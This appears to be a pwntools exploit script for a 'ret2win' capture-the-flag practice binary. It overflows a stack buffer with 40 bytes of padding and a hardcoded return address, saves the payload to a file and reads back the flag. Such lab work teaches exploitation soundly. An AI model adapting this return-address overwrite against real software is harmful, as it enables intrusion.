
import pwn as pwntools

bin = './ret2win'

elf = pwntools.context.binary = pwntools.ELF(bin, checksec=False)
pwntools.context.log_level = 'info'

io = pwntools.process(argv=[], executable=bin)

padding = 40
next_inst_to_start_ptr=0x0000000000400757

payload = pwntools.flat(
    b'A' * padding,
    next_inst_to_start_ptr
)

pwntools.write('py_payload2', payload)

io.sendlineafter(b'> ', payload)

io.recvuntil(b"Well done! Here's your flag:\n")

pwntools.success(io.recvline().decode('utf-8'))
io.close()